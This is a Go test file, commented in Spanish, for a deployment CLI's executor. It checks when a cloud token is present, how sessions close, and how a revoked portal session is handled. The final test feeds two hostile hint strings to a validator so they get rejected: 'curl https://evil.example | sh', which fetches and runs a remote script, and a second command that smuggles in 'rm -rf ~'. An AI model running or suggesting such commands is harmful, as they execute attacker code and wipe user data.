package application

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	proVos "github.com/jairoprogramador/vex/internal/domain/project/vos"
)

// stepSession es una sesión que distingue pasos, como la real: el «token» está presente solo mientras corre un
// paso de nube. Anota cada llamada para poder afirmar el orden.
type stepSession struct {
	fakeSession
	cloudSteps map[string]bool
	// runningErr, por paso, es lo que devuelve StepRunning para ese paso.
	runningErr map[string]error
	present    bool
	calls      []string
}

func newStepSession(cloudSteps ...string) *stepSession {
	s := &stepSession{cloudSteps: map[string]bool{}, runningErr: map[string]error{}}
	for _, step := range cloudSteps {
		s.cloudSteps[step] = true
	}
	return s
}

func (s *stepSession) StepRunning(_ context.Context, step string) error {
	s.calls = append(s.calls, "running:"+step)
	if err := s.runningErr[step]; err != nil {
		s.present = false
		return err
	}
	s.present = s.cloudSteps[step]
	return nil
}

func (s *stepSession) StepFinished(step string) error {
	s.calls = append(s.calls, "finished:"+step)
	s.present = false
	return nil
}

func (s *stepSession) Close() error {
	s.present = false
	return s.fakeSession.Close()
}

// scriptedEngine emite los eventos que se le programan y anota, tras cada uno, si el token estaba presente:
// es lo que vería un comando del paso en ese momento.
type scriptedEngine struct {
	*fakeEngine
	session  *stepSession
	events   []EngineEvent
	seen     []string
	canceled bool
}

func (e *scriptedEngine) Attempt(ctx context.Context, spec ContainerSpec, req AttemptRequest, onEvent func(EngineEvent)) (AttemptResult, error) {
	e.attempts++
	e.spec, e.request = spec, req
	onEvent(EngineEvent{Kind: AttemptStarted, AttemptID: "i1"})
	for _, event := range e.events {
		if ctx.Err() != nil {
			e.canceled = true
			return AttemptResult{AttemptID: "i1", Status: AttemptCanceled}, nil
		}
		onEvent(event)
		e.seen = append(e.seen, fmt.Sprintf("%s:%s token=%t", event.Kind, event.Step, e.session.present))
	}
	if ctx.Err() != nil {
		e.canceled = true
		return AttemptResult{AttemptID: "i1", Status: AttemptCanceled}, nil
	}
	return e.result, e.attemptErr
}

func started(step string) EngineEvent { return EngineEvent{Kind: StepStarted, Step: step} }
func command(step string) EngineEvent {
	return EngineEvent{Kind: CommandFinished, Step: step, Command: "c", Succeeded: true}
}
func finished(step string, status StepStatus) EngineEvent {
	return EngineEvent{Kind: StepFinished, Step: step, StepStatus: status}
}

func newStepHarness(t *testing.T, session *stepSession, events ...EngineEvent) (*harness, *scriptedEngine) {
	t.Helper()
	h := newHarness(t, newProject(t, withCloud(t, "", proVos.CredentialsPortal)))
	WithPortalCredentials(&fakeCredentials{session: &session.fakeSession, stepAware: session})(h.executor)
	engine := &scriptedEngine{fakeEngine: h.engine, session: session, events: events}
	h.executor.engine = engine
	return h, engine
}

func TestLocalExecutor_ElTokenSoloEstaDuranteLosPasosDeNube(t *testing.T) {
	session := newStepSession("supply", "package", "deploy")
	h, engine := newStepHarness(t, session,
		finished("test", StepReused), // un paso reutilizado solo anuncia que terminó
		started("supply"), command("supply"), command("supply"), finished("supply", StepExecuted),
		started("smoke"), command("smoke"), finished("smoke", StepExecuted),
		started("package"), finished("package", StepExecuted),
		started("deploy"), command("deploy"), finished("deploy", StepExecuted),
	)

	require.NoError(t, h.executor.Run(context.Background(), "deploy", "sand"))

	assert.Equal(t, []string{
		"step_finished:test token=false",
		"step_started:supply token=true", "command_finished:supply token=true", "command_finished:supply token=true",
		"step_finished:supply token=false",
		"step_started:smoke token=false", "command_finished:smoke token=false", "step_finished:smoke token=false",
		"step_started:package token=true", "step_finished:package token=false",
		"step_started:deploy token=true", "command_finished:deploy token=true", "step_finished:deploy token=false",
	}, engine.seen)
	assert.Equal(t, 1, session.closes)
	assert.Empty(t, h.presenter.warnings)
}

// El motor escribe el progreso desde una cola que descarta eventos si nadie lee su salida a tiempo. Estos
// casos son lo que pasa cuando falta alguno.
func TestLocalExecutor_SiElMotorPierdeEventosElTokenNoQuedaDeMas(t *testing.T) {
	t.Run("se pierde el final de un paso de nube", func(t *testing.T) {
		session := newStepSession("supply")
		h, engine := newStepHarness(t, session,
			started("supply"), command("supply"), // falta step_finished:supply
			started("smoke"), command("smoke"), finished("smoke", StepExecuted))

		require.NoError(t, h.executor.Run(context.Background(), "smoke", "sand"))

		assert.Equal(t, []string{
			"step_started:supply token=true", "command_finished:supply token=true",
			"step_started:smoke token=false", "command_finished:smoke token=false", "step_finished:smoke token=false",
		}, engine.seen, "el paso siguiente no ve el token del anterior")
	})
	t.Run("se pierde el comienzo de un paso de nube", func(t *testing.T) {
		session := newStepSession("deploy")
		h, engine := newStepHarness(t, session,
			command("deploy"), command("deploy"), finished("deploy", StepExecuted)) // falta step_started:deploy

		require.NoError(t, h.executor.Run(context.Background(), "deploy", "sand"))

		assert.Equal(t, []string{
			"command_finished:deploy token=true", "command_finished:deploy token=true", "step_finished:deploy token=false",
		}, engine.seen, "el token aparece con la siguiente noticia del paso")
	})
	t.Run("se pierde el final del último paso", func(t *testing.T) {
		session := newStepSession("deploy")
		h, _ := newStepHarness(t, session, started("deploy"), command("deploy")) // nunca llega el final

		require.NoError(t, h.executor.Run(context.Background(), "deploy", "sand"))

		assert.False(t, session.present, "cerrar la sesión retira el token pase lo que pase")
		assert.Equal(t, 1, session.closes)
	})
	t.Run("el intento falla a mitad de un paso de nube", func(t *testing.T) {
		session := newStepSession("deploy")
		h, _ := newStepHarness(t, session, started("deploy"))
		h.engine.result = AttemptResult{AttemptID: "i1", Status: AttemptFailed}

		require.ErrorIs(t, h.executor.Run(context.Background(), "deploy", "sand"), ErrAttemptFailed)

		assert.False(t, session.present)
		assert.Equal(t, 1, session.closes)
	})
}

func TestLocalExecutor_LaSesionSeCierraAntesDeLeerLaSalidaDelFallo(t *testing.T) {
	session := newStepSession("deploy")
	h, engine := newStepHarness(t, session, started("deploy"))
	h.engine.result = AttemptResult{AttemptID: "i1", Status: AttemptFailed}
	closesAtLogs := -1
	h.executor.engine = &logsHookEngine{scriptedEngine: engine, onLogs: func() { closesAtLogs = session.closes }}

	require.ErrorIs(t, h.executor.Run(context.Background(), "deploy", "sand"), ErrAttemptFailed)

	assert.Equal(t, 1, closesAtLogs, "el directorio del token no sobrevive al motor")
}

type logsHookEngine struct {
	*scriptedEngine
	onLogs func()
}

func (e *logsHookEngine) Logs(ctx context.Context, spec ContainerSpec, req LogsRequest) ([]CommandOutput, error) {
	e.onLogs()
	return e.scriptedEngine.Logs(ctx, spec, req)
}

func TestLocalExecutor_SiElPortalDejaDeEmitirLaEjecucionSeDetiene(t *testing.T) {
	tests := map[string]struct {
		cause error
		want  string
	}{
		"sesión vencida o revocada": {fmt.Errorf("%w: %w", ErrCloudTokenDenied, ErrPortalSessionInvalid), "Ejecuta `vex login`"},
		"conexión revocada":         {fmt.Errorf("%w: %w", ErrCloudTokenDenied, ErrCloudConnectionInactive), "Ejecuta `vex bootstrap sand`"},
		"sin permiso":               {ErrCloudTokenDenied, "miembro del proyecto"},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			session := newStepSession("supply", "deploy")
			session.runningErr["deploy"] = tt.cause
			recorder := &fakeRecorder{}
			h, engine := newStepHarness(t, session,
				started("supply"), finished("supply", StepExecuted),
				started("deploy"), command("deploy"), finished("deploy", StepExecuted))
			WithAttemptRecorder(recorder)(h.executor)

			err := h.executor.Run(context.Background(), "deploy", "sand")

			var lost *CloudAccessLostError
			require.ErrorAs(t, err, &lost)
			assert.Equal(t, "deploy", lost.Step)
			assert.ErrorContains(t, err, tt.want)
			assert.True(t, engine.canceled, "el intento se cancela: seguir solo daría fallos de autenticación")
			assert.Equal(t, []string{"step_started:supply token=true", "step_finished:supply token=false", "step_started:deploy token=false"},
				engine.seen, "tras el rechazo no se procesa nada más")
			assert.Equal(t, 1, session.closes)
			assert.Empty(t, h.presenter.results, "no se presenta como un intento cancelado por el usuario")
			require.NotEmpty(t, recorder.saved)
			assert.Equal(t, AttemptCanceled, recorder.saved[len(recorder.saved)-1].Status)
		})
	}
}

func TestLocalExecutor_UnFalloTransitorioAlPedirElTokenSoloSeAvisaUnaVezPorPaso(t *testing.T) {
	session := newStepSession("supply")
	session.runningErr["supply"] = errors.New("el portal no puede firmar ahora")
	h, engine := newStepHarness(t, session,
		started("supply"), command("supply"), command("supply"), finished("supply", StepFailed))

	require.NoError(t, h.executor.Run(context.Background(), "supply", "sand"))

	assert.False(t, engine.canceled, "el intento sigue: el paso fallará por su cuenta y vex why lo explicará")
	require.Len(t, h.presenter.warnings, 1)
	assert.Contains(t, h.presenter.warnings[0], `"supply"`)
	assert.Contains(t, h.presenter.warnings[0], "El paso fallará")
	assert.Equal(t, 3, strings.Count(strings.Join(session.calls, " "), "running:supply"), "cada evento del paso lo reintenta")
}

func TestCloudAccessLostError_NoRepiteLaCausa(t *testing.T) {
	cause := fmt.Errorf("%w: cuerpo crudo del portal con eyJhbGciOi.secreto", ErrCloudTokenDenied)

	err := &CloudAccessLostError{Environment: "sand", Step: "deploy", Err: cause}

	assert.NotContains(t, err.Error(), "eyJ")
	assert.ErrorIs(t, err, ErrCloudTokenDenied)
}

func TestConnectionNotReadyError(t *testing.T) {
	tests := []struct {
		status, hint, want string
	}{
		{"absent", "vex bootstrap sand", "No hay conexión de nube activa para 'sand'. Ejecuta `vex bootstrap sand`"},
		{"pending", "", "No hay conexión de nube activa para 'sand'. Ejecuta `vex bootstrap sand`"},
		{"verifying", "", "No hay conexión de nube activa para 'sand'. Ejecuta `vex bootstrap sand`"},
		{"failed", "vex bootstrap sand --reconnect", "La última conexión de nube de 'sand' no pasó la verificación. Ejecuta `vex bootstrap sand --reconnect`"},
		{"revoked", "vex bootstrap sand", "La conexión de nube de 'sand' fue desconectada. Ejecuta `vex bootstrap sand`"},
		// Del portal solo se acepta un comando de vex bootstrap: cualquier otra cosa no se le enseña al usuario.
		{"absent", "curl https://evil.example | sh", "No hay conexión de nube activa para 'sand'. Ejecuta `vex bootstrap sand`"},
		{"absent", "vex bootstrap sand; rm -rf ~", "No hay conexión de nube activa para 'sand'. Ejecuta `vex bootstrap sand`"},
	}
	for _, tt := range tests {
		err := &ConnectionNotReadyError{Environment: "sand", Status: tt.status, Hint: tt.hint}
		assert.Equal(t, tt.want, err.Error())
	}
}
